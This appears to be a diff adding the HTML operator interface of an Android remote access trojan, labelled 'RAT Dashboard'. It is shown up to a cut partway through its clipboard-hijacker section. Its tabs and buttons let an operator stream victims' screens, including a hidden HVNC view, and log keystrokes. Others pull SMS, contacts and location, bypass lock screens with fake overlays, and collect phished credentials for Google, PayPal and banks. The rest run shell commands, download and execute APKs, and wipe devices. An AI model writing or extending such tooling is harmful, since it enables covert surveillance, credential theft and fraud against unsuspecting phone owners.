@@ -1,1 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RAT Dashboard</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+<div id="root">
 
+  <!-- ═══════════════════════════════ HEADER ════════════════════════════════ -->
+  <header id="header">
+    <div class="logo">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
+      RAT Dashboard
+    </div>
+    <div class="sep"></div>
+    <div class="stat online" id="stat-online">
+      <span class="dot"></span>
+      <span id="stat-online-count">0</span> online
+    </div>
+    <div class="stat">
+      <span class="dot"></span>
+      <span id="stat-total-count">0</span> total
+    </div>
+    <div id="conn-indicator">
+      <span class="dot"></span>
+      <span id="conn-label">DISCONNECTED</span>
+    </div>
+  </header>
+
+  <!-- ═══════════════════════════════ BOT LIST ═════════════════════════════ -->
+  <aside id="bot-list-panel">
+    <div id="bot-list-header">
+      Devices
+      <span id="bot-count">0</span>
+    </div>
+    <div id="bot-list">
+      <!-- .bot-item populated by app.js -->
+    </div>
+  </aside>
+
+  <!-- ═══════════════════════════════ MAIN ════════════════════════════════ -->
+  <main id="main-panel">
+
+    <!-- No bot selected state -->
+    <div id="no-bot">
+      <svg viewBox="0 0 24 24"><path d="M17 2H7C5.9 2 5 2.9 5 4v16c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H7V6h10v10z"/></svg>
+      <p>Select a device to begin</p>
+    </div>
+
+    <!-- Bot panel (visible when device selected) -->
+    <div id="bot-panel" style="display:none;">
+
+      <!-- Device identity bar -->
+      <div id="device-header">
+        <span class="device-id" id="dh-id">—</span>
+        <span class="device-model" id="dh-model">—</span>
+        <div class="device-badges" id="dh-badges"></div>
+      </div>
+
+      <!-- Tab bar -->
+      <div id="tab-bar">
+        <button class="tab-btn active" data-tab="overview">Overview</button>
+        <button class="tab-btn" data-tab="vnc">Screen</button>
+        <button class="tab-btn" data-tab="hvnc">HVNC</button>
+        <button class="tab-btn" data-tab="files">Files</button>
+        <button class="tab-btn" data-tab="sms">SMS</button>
+        <button class="tab-btn" data-tab="contacts">Contacts</button>
+        <button class="tab-btn" data-tab="keylogs">Keylogs</button>
+        <button class="tab-btn" data-tab="apps">Apps</button>
+        <button class="tab-btn" data-tab="controls">Controls</button>
+        <button class="tab-btn" data-tab="phishing">Phishing</button>
+        <button class="tab-btn" data-tab="fakecall">Fake Call</button>
+        <button class="tab-btn" data-tab="clipper">Clipper</button>
+        <button class="tab-btn" data-tab="identity">Identity</button>
+      </div>
+
+      <!-- Tab content -->
+      <div id="tab-content">
+
+        <!-- ─────────────────── OVERVIEW ─────────────────── -->
+        <div class="tab-pane active" id="tab-overview">
+          <div class="grid-2">
+            <!-- Device info -->
+            <div class="card">
+              <div class="card-title">Device Info</div>
+              <div class="info-row"><span class="info-label">Device ID</span><span class="info-value mono" id="ov-id">—</span></div>
+              <div class="info-row"><span class="info-label">Model</span><span class="info-value" id="ov-model">—</span></div>
+              <div class="info-row"><span class="info-label">Manufacturer</span><span class="info-value" id="ov-mfr">—</span></div>
+              <div class="info-row"><span class="info-label">Android</span><span class="info-value" id="ov-android">—</span></div>
+              <div class="info-row"><span class="info-label">SDK</span><span class="info-value" id="ov-sdk">—</span></div>
+              <div class="info-row"><span class="info-label">Network</span><span class="info-value" id="ov-net">—</span></div>
+              <div class="info-row"><span class="info-label">Operator</span><span class="info-value" id="ov-sim">—</span></div>
+              <div class="info-row"><span class="info-label">Battery</span><span class="info-value" id="ov-bat">—</span></div>
+              <div class="info-row"><span class="info-label">First Seen</span><span class="info-value" id="ov-first">—</span></div>
+              <div class="info-row"><span class="info-label">Last Seen</span><span class="info-value" id="ov-last">—</span></div>
+            </div>
+
+            <!-- Status & quick actions -->
+            <div>
+              <div class="card">
+                <div class="card-title">Status</div>
+                <div class="info-row"><span class="info-label">Admin Device</span><span class="info-value" id="ov-admin">—</span></div>
+                <div class="info-row"><span class="info-label">Accessibility</span><span class="info-value" id="ov-acc">—</span></div>
+                <div class="info-row"><span class="info-label">Connection</span><span class="info-value" id="ov-conn">—</span></div>
+              </div>
+              <div class="card">
+                <div class="card-title">Quick Actions</div>
+                <div class="btn-group">
+                  <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_DEVICE_INFO')">Refresh Info</button>
+                  <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_SMS')">Get SMS</button>
+                  <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_CONTACTS')">Get Contacts</button>
+                  <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_INSTALLED_APPS')">Get Apps</button>
+                  <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_LOCATION')">Get Location</button>
+                  <button class="btn btn-accent btn-sm" onclick="App.cmd('START_KEYLOGGER')">Start Keylog</button>
+                  <button class="btn btn-warning btn-sm" onclick="App.cmd('VIBRATE',{duration:500})">Vibrate</button>
+                  <button class="btn btn-danger btn-sm" onclick="App.cmd('LOCK_DEVICE')">Lock</button>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-title">Location</div>
+                <div class="info-row"><span class="info-label">Lat/Lng</span><span class="info-value" id="ov-loc">—</span></div>
+                <div class="info-row"><span class="info-label">Accuracy</span><span class="info-value" id="ov-loc-acc">—</span></div>
+                <div class="info-row"><span class="info-label">Provider</span><span class="info-value" id="ov-loc-prov">—</span></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Accounts -->
+          <div class="card">
+            <div class="card-title">Accounts</div>
+            <div id="ov-accounts"><span class="text-muted">—</span></div>
+          </div>
+
+          <!-- Permissions -->
+          <div class="card">
+            <div class="card-title">Permissions</div>
+            <div class="perm-grid" id="ov-perms"></div>
+          </div>
+
+          <!-- Recent activity -->
+          <div class="card">
+            <div class="card-title">Recent Activity</div>
+            <div id="activity-log"></div>
+          </div>
+        </div>
+
+        <!-- ─────────────────── SCREEN / VNC ─────────────────── -->
+        <div class="tab-pane" id="tab-vnc" style="padding:0; display:flex; flex-direction:column;">
+          <div class="vnc-toolbar">
+            <button class="btn btn-accent btn-sm" id="vnc-start-btn" onclick="App.startVnc()">▶ Start Screen</button>
+            <button class="btn btn-sm" id="vnc-stop-btn" onclick="App.stopVnc()" style="display:none;">■ Stop</button>
+            <div class="sep-v" style="height:20px; margin: 0 4px;"></div>
+            <button class="btn btn-sm" onclick="App.cmd('TAKE_SCREENSHOT')">📷 Screenshot</button>
+            <button class="btn btn-sm" onclick="App.cmd('TURN_SCREEN_ON')">💡 Screen On</button>
+            <button class="btn btn-sm" onclick="App.cmd('TURN_SCREEN_OFF')">🌑 Screen Off</button>
+            <div class="sep-v" style="height:20px; margin: 0 4px;"></div>
+            <label style="font-size:11px; color:var(--text-muted);">Quality:</label>
+            <select id="vnc-quality" style="width:80px; padding:4px;" onchange="App.vncQualityChange()">
+              <option value="30">30%</option>
+              <option value="50" selected>50%</option>
+              <option value="70">70%</option>
+              <option value="90">90%</option>
+            </select>
+            <label style="font-size:11px; color:var(--text-muted); margin-left:8px;">Scale:</label>
+            <select id="vnc-scale" style="width:80px; padding:4px;">
+              <option value="0.5">50%</option>
+              <option value="0.75" selected>75%</option>
+              <option value="1">100%</option>
+            </select>
+            <span style="margin-left:auto; font-size:11px; color:var(--text-muted);" id="vnc-fps">— fps</span>
+          </div>
+          <div class="canvas-wrap" id="vnc-wrap">
+            <canvas id="vnc-canvas"></canvas>
+            <div class="vnc-overlay-msg" id="vnc-overlay">Start screen to see live view</div>
+          </div>
+          <div class="type-bar">
+            <input type="text" id="vnc-type-input" placeholder="Type text to send to device (Enter to send)…" style="flex:1;" />
+            <button class="btn btn-accent btn-sm" onclick="App.vncSendText()">Send</button>
+            <button class="btn btn-sm" onclick="App.cmd('PRESS_HOME')">⌂ Home</button>
+            <button class="btn btn-sm" onclick="App.cmd('PRESS_BACK')">← Back</button>
+            <button class="btn btn-sm" onclick="App.cmd('PRESS_RECENT')">⧉ Recents</button>
+          </div>
+        </div>
+
+        <!-- ─────────────────── HVNC ─────────────────── -->
+        <div class="tab-pane" id="tab-hvnc" style="padding:0; display:flex; flex-direction:column;">
+          <div class="vnc-toolbar">
+            <button class="btn btn-accent btn-sm" id="hvnc-start-btn" onclick="App.startHvnc()">▶ Start HVNC</button>
+            <button class="btn btn-sm" id="hvnc-stop-btn" onclick="App.stopHvnc()" style="display:none;">■ Stop</button>
+            <div class="sep-v" style="height:20px; margin: 0 4px;"></div>
+            <button class="btn btn-sm" onclick="App.cmd('OPEN_APP',{package:'com.android.settings'})">⚙ Settings</button>
+            <button class="btn btn-sm" onclick="App.cmd('OPEN_APP',{package:'com.android.chrome'})">🌐 Chrome</button>
+            <span style="margin-left:auto; font-size:11px; color:var(--text-muted);" id="hvnc-fps">— fps</span>
+          </div>
+          <div class="canvas-wrap" id="hvnc-wrap">
+            <canvas id="hvnc-canvas"></canvas>
+            <div class="vnc-overlay-msg" id="hvnc-overlay">Start HVNC to see hidden view</div>
+          </div>
+          <div class="type-bar">
+            <input type="text" id="hvnc-type-input" placeholder="Type text to send via HVNC…" style="flex:1;" />
+            <button class="btn btn-accent btn-sm" onclick="App.hvncSendText()">Send</button>
+            <button class="btn btn-sm" onclick="App.hvncCmd('HOME')">Home</button>
+            <button class="btn btn-sm" onclick="App.hvncCmd('BACK')">Back</button>
+            <button class="btn btn-sm" onclick="App.hvncCmd('RECENTS')">Recents</button>
+          </div>
+        </div>
+
+        <!-- ─────────────────── FILES ─────────────────── -->
+        <div class="tab-pane" id="tab-files">
+          <div class="card" style="margin-bottom:10px;">
+            <div style="display:flex; gap:8px; align-items:center;">
+              <button class="btn btn-sm" onclick="App.fileNavUp()">↑ Up</button>
+              <input type="text" id="file-path-input" value="/" style="flex:1; font-family:var(--font-mono); font-size:11px;" />
+              <button class="btn btn-accent btn-sm" onclick="App.fileBrowse()">Browse</button>
+              <button class="btn btn-sm" onclick="App.fileRefresh()">⟳</button>
+            </div>
+          </div>
+          <div class="card">
+            <div id="file-list">
+              <div class="empty-state">Browse to a directory</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ─────────────────── SMS ─────────────────── -->
+        <div class="tab-pane" id="tab-sms">
+          <div class="card" style="margin-bottom:10px;">
+            <div style="display:flex; gap:8px; align-items:center;">
+              <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_SMS')">⟳ Refresh SMS</button>
+              <input type="text" id="sms-search" placeholder="Search…" style="flex:1;" oninput="App.smsSearch(this.value)" />
+            </div>
+          </div>
+          <div class="card" style="padding:0; overflow:hidden;">
+            <div id="sms-list"></div>
+          </div>
+        </div>
+
+        <!-- ─────────────────── CONTACTS ─────────────────── -->
+        <div class="tab-pane" id="tab-contacts">
+          <div class="card" style="margin-bottom:10px;">
+            <div style="display:flex; gap:8px; align-items:center;">
+              <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_CONTACTS')">⟳ Refresh</button>
+              <input type="text" id="contacts-search" placeholder="Search…" style="flex:1;" oninput="App.contactsSearch(this.value)" />
+            </div>
+          </div>
+          <div class="card" style="padding:0; overflow:hidden;">
+            <div id="contacts-list"></div>
+          </div>
+        </div>
+
+        <!-- ─────────────────── KEYLOGS ─────────────────── -->
+        <div class="tab-pane" id="tab-keylogs">
+          <div class="card" style="margin-bottom:10px;">
+            <div class="btn-group">
+              <button class="btn btn-accent btn-sm" onclick="App.cmd('START_KEYLOGGER')">▶ Start</button>
+              <button class="btn btn-sm" onclick="App.cmd('STOP_KEYLOGGER')">■ Stop</button>
+              <button class="btn btn-sm" onclick="App.keylogRefresh()">⟳ Refresh</button>
+              <button class="btn btn-danger btn-sm" onclick="App.keylogClear()">🗑 Clear</button>
+              <button class="btn btn-sm" onclick="App.keylogCopy()">📋 Copy All</button>
+            </div>
+          </div>
+          <div id="keylog-viewer"></div>
+        </div>
+
+        <!-- ─────────────────── APPS ─────────────────── -->
+        <div class="tab-pane" id="tab-apps">
+          <div class="card" style="margin-bottom:10px;">
+            <div style="display:flex; gap:8px;">
+              <button class="btn btn-accent btn-sm" onclick="App.cmd('GET_INSTALLED_APPS')">⟳ Refresh Apps</button>
+              <input type="text" id="apps-search" placeholder="Search package/name…" style="flex:1;" oninput="App.appsSearch(this.value)" />
+            </div>
+          </div>
+          <div id="app-grid"></div>
+        </div>
+
+        <!-- ─────────────────── CONTROLS ─────────────────── -->
+        <div class="tab-pane" id="tab-controls">
+
+          <!-- Device -->
+          <details class="ctrl-section" open>
+            <summary>📱 Device</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-sm" onclick="App.cmd('LOCK_DEVICE')">Lock</button>
+                <button class="btn btn-sm" onclick="App.cmd('TURN_SCREEN_ON')">Screen On</button>
+                <button class="btn btn-sm" onclick="App.cmd('TURN_SCREEN_OFF')">Screen Off</button>
+                <button class="btn btn-sm" onclick="App.cmd('PRESS_HOME')">Home</button>
+                <button class="btn btn-sm" onclick="App.cmd('PRESS_BACK')">Back</button>
+                <button class="btn btn-sm" onclick="App.cmd('PRESS_RECENT')">Recents</button>
+                <button class="btn btn-sm" onclick="App.cmd('EXPAND_NOTIFICATIONS')">Notif Panel</button>
+                <button class="btn btn-sm" onclick="App.cmd('CLOSE_SYSTEM_DIALOGS')">Close Dialogs</button>
+                <button class="btn btn-sm" onclick="App.cmd('GET_DEVICE_INFO')">Device Info</button>
+                <button class="btn btn-warning btn-sm" onclick="App.promptVibrate()">Vibrate…</button>
+                <button class="btn btn-danger btn-sm" onclick="App.cmd('REBOOT')">Reboot</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Navigation / Volume -->
+          <details class="ctrl-section">
+            <summary>🔊 Volume / Navigation</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-sm" onclick="App.cmd('VOLUME_UP')">Vol +</button>
+                <button class="btn btn-sm" onclick="App.cmd('VOLUME_DOWN')">Vol −</button>
+                <button class="btn btn-sm" onclick="App.cmd('VOLUME_MUTE')">Mute</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Torch / Camera -->
+          <details class="ctrl-section">
+            <summary>🔦 Torch &amp; Camera</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-sm" onclick="App.cmd('TORCH_ON')">Torch On</button>
+                <button class="btn btn-sm" onclick="App.cmd('TORCH_OFF')">Torch Off</button>
+                <button class="btn btn-sm" onclick="App.cmd('TAKE_SCREENSHOT')">Screenshot</button>
+                <button class="btn btn-accent btn-sm" onclick="App.promptTakePhoto()">Take Photo…</button>
+                <button class="btn btn-accent btn-sm" onclick="App.promptStartCamera()">Start Camera…</button>
+                <button class="btn btn-sm" onclick="App.cmd('STOP_CAMERA')">Stop Camera</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Microphone -->
+          <details class="ctrl-section">
+            <summary>🎙 Microphone</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-accent btn-sm" onclick="App.promptStartMic()">Start Recording…</button>
+                <button class="btn btn-sm" onclick="App.cmd('STOP_MIC')">Stop</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Location -->
+          <details class="ctrl-section">
+            <summary>📍 Location</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-sm" onclick="App.cmd('GET_LOCATION')">Get Location</button>
+                <button class="btn btn-accent btn-sm" onclick="App.promptStartLocationTrack()">Start Tracking…</button>
+                <button class="btn btn-sm" onclick="App.cmd('STOP_LOCATION')">Stop Tracking</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Keylogger -->
+          <details class="ctrl-section">
+            <summary>⌨️ Keylogger</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-success btn-sm" onclick="App.cmd('START_KEYLOGGER')">Start</button>
+                <button class="btn btn-sm" onclick="App.cmd('STOP_KEYLOGGER')">Stop</button>
+                <button class="btn btn-danger btn-sm" onclick="App.keylogClear()">Clear</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- SMS -->
+          <details class="ctrl-section">
+            <summary>💬 SMS</summary>
+            <div class="ctrl-body">
+              <div class="grid-2" style="gap:10px;">
+                <div class="input-group">
+                  <label>To (number)</label>
+                  <input type="text" id="sms-to" placeholder="+1234567890" />
+                </div>
+                <div class="input-group">
+                  <label>Message</label>
+                  <textarea id="sms-body" rows="3" placeholder="Message text…"></textarea>
+                </div>
+              </div>
+              <div class="btn-group" style="margin-top:8px;">
+                <button class="btn btn-accent btn-sm" onclick="App.sendSms()">Send SMS</button>
+                <button class="btn btn-sm" onclick="App.cmd('GET_SMS')">Fetch SMS</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Calls -->
+          <details class="ctrl-section">
+            <summary>📞 Call</summary>
+            <div class="ctrl-body">
+              <div class="input-row">
+                <div class="input-group">
+                  <label>Phone Number</label>
+                  <input type="text" id="call-number" placeholder="+1234567890" />
+                </div>
+                <button class="btn btn-success btn-sm" onclick="App.makeCall()">Call</button>
+                <button class="btn btn-danger btn-sm" onclick="App.cmd('END_CALL')">End Call</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- App control -->
+          <details class="ctrl-section">
+            <summary>📦 App Control</summary>
+            <div class="ctrl-body">
+              <div class="input-row">
+                <div class="input-group">
+                  <label>Package Name</label>
+                  <input type="text" id="pkg-input" placeholder="com.example.app" />
+                </div>
+                <button class="btn btn-sm" onclick="App.openApp()">Open</button>
+                <button class="btn btn-danger btn-sm" onclick="App.uninstallApp()">Uninstall</button>
+                <button class="btn btn-sm" onclick="App.forceStop()">Force Stop</button>
+                <button class="btn btn-sm" onclick="App.clearAppData()">Clear Data</button>
+              </div>
+              <div class="input-row" style="margin-top:4px;">
+                <div class="input-group">
+                  <label>Block package (add to block list)</label>
+                  <input type="text" id="block-pkg-input" placeholder="com.example.app" />
+                </div>
+                <button class="btn btn-warning btn-sm" onclick="App.blockPackage()">Block</button>
+                <button class="btn btn-sm" onclick="App.unblockPackage()">Unblock</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Admin / Permissions -->
+          <details class="ctrl-section">
+            <summary>🛡 Admin &amp; Permissions</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-danger btn-sm" onclick="App.cmd('REQUEST_ADMIN')">Request Admin</button>
+                <button class="btn btn-sm" onclick="App.cmd('REMOVE_ADMIN')">Remove Admin</button>
+                <button class="btn btn-danger btn-sm" onclick="App.cmd('WIPE_DEVICE')">WIPE DEVICE</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Notification -->
+          <details class="ctrl-section">
+            <summary>🔔 Notification</summary>
+            <div class="ctrl-body">
+              <div class="grid-2" style="gap:10px;">
+                <div class="input-group">
+                  <label>Title</label>
+                  <input type="text" id="notif-title" placeholder="Notification title" />
+                </div>
+                <div class="input-group">
+                  <label>Body</label>
+                  <input type="text" id="notif-body" placeholder="Notification body" />
+                </div>
+              </div>
+              <div class="btn-group" style="margin-top:8px;">
+                <button class="btn btn-accent btn-sm" onclick="App.sendNotification()">Send</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Toast -->
+          <details class="ctrl-section">
+            <summary>💬 Toast / Dialog</summary>
+            <div class="ctrl-body">
+              <div class="input-row">
+                <div class="input-group">
+                  <label>Toast Message</label>
+                  <input type="text" id="toast-msg" placeholder="Toast text…" />
+                </div>
+                <button class="btn btn-sm" onclick="App.sendToast()">Show Toast</button>
+              </div>
+              <div class="input-row" style="margin-top:4px;">
+                <div class="input-group">
+                  <label>Alert Title</label>
+                  <input type="text" id="dialog-title" placeholder="Title" />
+                </div>
+                <div class="input-group">
+                  <label>Alert Message</label>
+                  <input type="text" id="dialog-msg" placeholder="Message body" />
+                </div>
+                <button class="btn btn-sm" onclick="App.sendDialog()">Show Alert</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Shell -->
+          <details class="ctrl-section">
+            <summary>💻 Shell</summary>
+            <div class="ctrl-body">
+              <div class="input-row">
+                <div class="input-group">
+                  <label>Command</label>
+                  <input type="text" id="shell-cmd" placeholder="ls /sdcard" />
+                </div>
+                <button class="btn btn-accent btn-sm" onclick="App.runShell()">Run</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- URL / Browser -->
+          <details class="ctrl-section">
+            <summary>🌐 Browser / URL</summary>
+            <div class="ctrl-body">
+              <div class="input-row">
+                <div class="input-group">
+                  <label>URL to open on device</label>
+                  <input type="text" id="open-url" placeholder="https://…" />
+                </div>
+                <button class="btn btn-accent btn-sm" onclick="App.openUrl()">Open URL</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Download + execute -->
+          <details class="ctrl-section">
+            <summary>⬇️ Download &amp; Execute</summary>
+            <div class="ctrl-body">
+              <div class="input-row">
+                <div class="input-group">
+                  <label>File URL</label>
+                  <input type="text" id="dl-url" placeholder="https://…/file.apk" />
+                </div>
+                <button class="btn btn-warning btn-sm" onclick="App.downloadFile()">Download</button>
+              </div>
+              <div class="input-row" style="margin-top:4px;">
+                <div class="input-group">
+                  <label>Execute file path (on device)</label>
+                  <input type="text" id="exec-path" placeholder="/sdcard/Download/file.apk" />
+                </div>
+                <button class="btn btn-danger btn-sm" onclick="App.execFile()">Execute</button>
+              </div>
+            </div>
+          </details>
+
+          <!-- Lock bypass -->
+          <details class="ctrl-section" open>
+            <summary>🔓 Lock Bypass &amp; Auto-Unlock</summary>
+            <div class="ctrl-body">
+
+              <!-- Quick bypass -->
+              <div class="ctrl-label">Quick Actions</div>
+              <div class="btn-group">
+                <button class="btn btn-danger btn-sm" onclick="App.cmd('BYPASS_LOCK_SCREEN')">Bypass Lock</button>
+                <button class="btn btn-danger btn-sm" onclick="App.cmd('REMOVE_DEVICE_PASSWORD')">Remove Password</button>
+              </div>
+
+              <!-- Set PIN -->
+              <div class="input-row" style="margin-top:8px;">
+                <div class="input-group">
+                  <label>Set PIN (admin)</label>
+                  <input type="text" id="set-pin" placeholder="0000" maxlength="16" />
+                </div>
+                <button class="btn btn-sm" onclick="App.setDevicePin()">Set PIN</button>
+              </div>
+
+              <!-- Fake lockscreen overlay -->
+              <div class="ctrl-label" style="margin-top:12px;">Fake Lockscreen Overlay</div>
+              <div class="input-row">
+                <div class="input-group">
+                  <label>Type</label>
+                  <select id="lockscreen-type" class="ctrl-input">
+                    <option value="PIN">PIN</option>
+                    <option value="PATTERN">Pattern</option>
+                    <option value="PASSWORD">Password</option>
+                  </select>
+                </div>
+                <button class="btn btn-sm" onclick="App.showLockscreen()">Show Overlay</button>
+                <button class="btn btn-sm btn-danger" onclick="App.hideLockscreen()">Hide Overlay</button>
+              </div>
+              <!-- PIN keypad for fake lockscreen -->
+              <div class="ctrl-label" style="margin-top:8px;">Simulate PIN Key Press</div>
+              <div class="btn-group" style="flex-wrap:wrap; gap:4px;">
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('1')">1</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('2')">2</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('3')">3</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('4')">4</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('5')">5</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('6')">6</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('7')">7</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('8')">8</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('9')">9</button>
+                <button class="btn btn-sm" style="width:44px;" onclick="App.lockKeyPress('0')">0</button>
+                <button class="btn btn-sm btn-danger" style="width:64px;" onclick="App.lockKeyPress('DEL')">DEL</button>
+                <button class="btn btn-sm" style="width:64px;" onclick="App.lockKeyPress('OK')">OK</button>
+              </div>
+
+              <!-- Gesture recording -->
+              <div class="ctrl-label" style="margin-top:12px;">Gesture Recording (unlock replay)</div>
+              <div class="btn-group">
+                <button class="btn btn-sm" id="unlock-rec-start" onclick="App.startUnlockRecording()">⏺ Start Recording</button>
+                <button class="btn btn-sm btn-danger" id="unlock-rec-stop" disabled onclick="App.stopUnlockRecording()">⏹ Stop Recording</button>
+                <button class="btn btn-sm" onclick="App.playUnlockSequence()">▶ Play Sequence</button>
+              </div>
+              <div class="input-row" style="margin-top:6px;">
+                <div class="input-group" style="flex:1;">
+                  <label>Sequence JSON (optional override)</label>
+                  <input type="text" id="unlock-seq-input" placeholder="Leave blank to replay saved" style="font-family:monospace;font-size:11px;" />
+                </div>
+              </div>
+              <div id="unlock-seq-display" style="font-family:monospace;font-size:10px;color:var(--accent);word-break:break-all;min-height:18px;margin-top:4px;"></div>
+
+              <!-- Pattern unlock -->
+              <div class="ctrl-label" style="margin-top:12px;">Pattern Unlock (direct)</div>
+              <div class="input-row">
+                <div class="input-group">
+                  <label>Pattern (e.g. 14789 = L-shape)</label>
+                  <input type="text" id="pattern-input" placeholder="14789" maxlength="9" />
+                </div>
+                <button class="btn btn-sm" onclick="App.patternUnlock()">Execute Pattern</button>
+              </div>
+
+              <!-- Captured credentials -->
+              <div class="ctrl-label" style="margin-top:12px;">
+                Captured Credentials
+                <button class="btn btn-xs btn-danger" style="float:right;margin-top:-2px;" onclick="App.clearCredentials()">Clear</button>
+              </div>
+              <div id="credentials-list" class="credentials-list">
+                <div class="empty-state">No credentials captured yet</div>
+              </div>
+
+            </div>
+          </details>
+
+          <!-- Bluetooth / WiFi -->
+          <details class="ctrl-section">
+            <summary>📡 Bluetooth &amp; WiFi</summary>
+            <div class="ctrl-body">
+              <div class="btn-group">
+                <button class="btn btn-sm" onclick="App.cmd('ENABLE_BLUETOOTH')">BT On</button>
+                <button class="btn btn-sm" onclick="App.cmd('DISABLE_BLUETOOTH')">BT Off</button>
+                <button class="btn btn-sm" onclick="App.cmd('ENABLE_WIFI')">WiFi On</button>
+                <button class="btn btn-sm" onclick="App.cmd('DISABLE_WIFI')">WiFi Off</button>
+                <button class="btn btn-sm" onclick="App.cmd('GET_WIFI_LIST')">WiFi List</button>
+              </div>
+            </div>
+          </details>
+
+        </div>
+
+        <!-- ─────────────────── PHISHING ─────────────────── -->
+        <div class="tab-pane" id="tab-phishing">
+          <div class="card">
+            <div class="card-title">Phishing Overlay</div>
+            <div class="grid-2" style="gap:10px; margin-bottom:12px;">
+              <div class="input-group">
+                <label>Package to overlay</label>
+                <input type="text" id="ph-package" placeholder="com.android.chrome" />
+              </div>
+              <div class="input-group">
+                <label>Phishing type / URL</label>
+                <input type="text" id="ph-url" placeholder="https://phishing-page.html or built-in type" />
+              </div>
+            </div>
+            <div class="btn-group">
+              <button class="btn btn-danger btn-sm" onclick="App.startPhishing()">Start Overlay</button>
+              <button class="btn btn-sm" onclick="App.stopPhishing()">Stop Overlay</button>
+              <button class="btn btn-sm" onclick="App.cmd('GET_PHISHING_RESULT')">Get Result</button>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-title">Built-in Phishing Pages</div>
+            <div class="grid-3" style="gap:8px;">
+              <button class="btn btn-sm" onclick="App.startBuiltinPhish('google')">Google</button>
+              <button class="btn btn-sm" onclick="App.startBuiltinPhish('facebook')">Facebook</button>
+              <button class="btn btn-sm" onclick="App.startBuiltinPhish('whatsapp')">WhatsApp</button>
+              <button class="btn btn-sm" onclick="App.startBuiltinPhish('instagram')">Instagram</button>
+              <button class="btn btn-sm" onclick="App.startBuiltinPhish('paypal')">PayPal</button>
+              <button class="btn btn-sm" onclick="App.startBuiltinPhish('bank')">Generic Bank</button>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-title">Captured Credentials</div>
+            <div id="phishing-results"><div class="empty-state">No captured data yet</div></div>
+          </div>
+        </div>
+
+        <!-- ─────────────────── FAKE CALL ─────────────────── -->
+        <div class="tab-pane" id="tab-fakecall">
+          <div class="card">
+            <div class="card-title">Fake Incoming Call</div>
+            <div class="grid-2" style="gap:10px; margin-bottom:12px;">
+              <div class="input-group">
+                <label>Caller Name</label>
+                <input type="text" id="fc-name" placeholder="Mom" />
+              </div>
+              <div class="input-group">
+                <label>Caller Number</label>
+                <input type="text" id="fc-number" placeholder="+1234567890" />
+              </div>
+            </div>
+            <div class="btn-group">
+              <button class="btn btn-success btn-lg" onclick="App.fakeCall()">📞 Trigger Fake Call</button>
+            </div>
+          </div>
+
+          <div class="card" style="margin-top:12px;">
+            <div class="card-title">Fake Notification</div>
+            <div class="grid-2" style="gap:10px; margin-bottom:12px;">
+              <div class="input-group">
+                <label>App Package</label>
+                <input type="text" id="fn-package" placeholder="com.whatsapp" />
+              </div>
+              <div class="input-group">
+                <label>Sender</label>
+                <input type="text" id="fn-sender" placeholder="John Doe" />
+              </div>
+            </div>
+            <div class="input-group" style="margin-bottom:10px;">
+              <label>Message</label>
+              <input type="text" id="fn-message" placeholder="Hey, are you free?" />
+            </div>
+            <div class="btn-group">
+              <button class="btn btn-accent btn-sm" onclick="App.fakeNotification()">Send Fake Notification</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- ─────────────────── CLIPPER ─────────────────── -->
+        <div class="tab-pane" id="tab-clipper">
+          <div class="card">
+            <div class="card-title">Clipboard Hijacker</div>
+            <div class="toggle-row">
+              <div>
+                <div class="toggle-label">Clipper Active</div>
+                <div class="toggle-sub">Automatically replace clipboard content</div>
+              </div>
+              <label class="toggle">
+                <input type="checkbox" id="clipper-toggle" onchange="App.clipperToggle(this.checked)" />
+                <span class="toggle-track"></span>
